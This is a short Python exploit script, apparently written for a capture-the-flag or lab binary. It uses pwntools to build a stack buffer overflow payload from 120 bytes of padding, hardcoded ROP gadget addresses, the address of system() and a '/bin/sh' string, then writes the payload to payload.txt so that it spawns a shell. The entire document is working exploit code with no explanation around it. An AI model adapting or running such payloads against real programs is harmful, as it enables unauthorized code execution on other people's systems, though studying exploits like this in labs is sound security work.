#!/usr/bin/python3
from pwn import *

# Stage 0
junk = b'A' * 120 # Overflow
cmd = b'/bin/sh\x00' # Argument

# ROP
pop = p64(0x401206) # pop r13
mov = p64(0x401156) # mov rdi, rsp

# RCE
fake = p64(0x000000) # dummy value for pop r14 and pop r15
system = p64(0x401040) # system address


# Create Payload
payload = junk + pop + system + fake + fake + mov + cmd

f = open("payload.txt", "wb")
f.write(payload)
